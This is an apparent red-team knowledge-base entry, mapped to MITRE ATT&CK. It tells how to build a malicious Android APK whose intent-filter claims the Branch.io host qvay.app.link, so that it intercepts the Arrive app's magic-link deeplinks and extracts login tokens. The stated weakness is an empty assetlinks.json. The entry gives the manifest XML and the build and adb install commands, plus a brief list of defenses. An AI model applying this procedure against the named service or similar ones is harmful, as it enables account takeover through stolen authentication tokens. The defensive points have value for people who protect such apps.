---
id: proc-uuid-2
tags:
  - android
  - intent-filter
  - deeplink
type: procedure
tools:
  - '[[tools/Android-SDK]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/android-intent-filter-xml]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Hijack Execution Flow]]'
updated_at: '2025-12-14T17:33:12.316Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Hijack Execution Flow]]'
---
# Configure-Malicious-App-for-Deeplink-Interception

## Summary

This procedure configures a malicious Android APK to register an intent-filter for the Branch.io domain qvay.app.link, enabling interception of unverified deeplinks used in the Arrive app's magic link process due to the empty assetlinks.json file.

## Description

Android App Links require verification via assetlinks.json to ensure only the legitimate app handles deeplinks. The qvay.app.link domain has an empty file, allowing any app to claim the host via intent-filter. This procedure adds the filter to AndroidManifest.xml, builds the APK, and installs it, positioning the app to hijack magic links for token extraction.

## Requirements

1. Android development environment with SDK
2. Basic Android app project (e.g., empty activity)
3. Target device for APK installation

## Defense

Defensive measures and detection strategies:

- Implement proper App Links verification with populated assetlinks.json
- Use Android's verified links and package visibility
- Detect sideloaded APKs with broad intent-filters via app scanning tools

## Objectives

1. Register malicious app to capture deeplinks
2. Bypass App Links protection
3. Enable intent hijacking for exploitation

## Instructions

### Step 1: Add Intent-Filter to Manifest

**Context**: Edit AndroidManifest.xml to match the deeplink scheme and host.

**Command** ([[commands/android-intent-filter-xml]]):
```xml
<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <category android:name="android.intent.category.BROWSABLE" />
  <data android:scheme="https" />
  <data android:host="qvay.app.link" />
</intent-filter>
```

> Place this in the activity tag. This matches HTTPS URIs for qvay.app.link, allowing default handling.

### Step 2: Build and Install APK

**Context**: Compile the app and sideload it onto the device.

Use Android Studio or command line: `./gradlew assembleDebug` then `adb install app-debug.apk`.

**Expected Output**: APK installed; app can receive matching intents.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Hijack Execution Flow]] Hijack Execution Flow

### Sub-Techniques


## Commands Used

- [[commands/android-intent-filter-xml]]

## Tools Used

- [[tools/Android-SDK]]

## Tags

- android
- deeplink
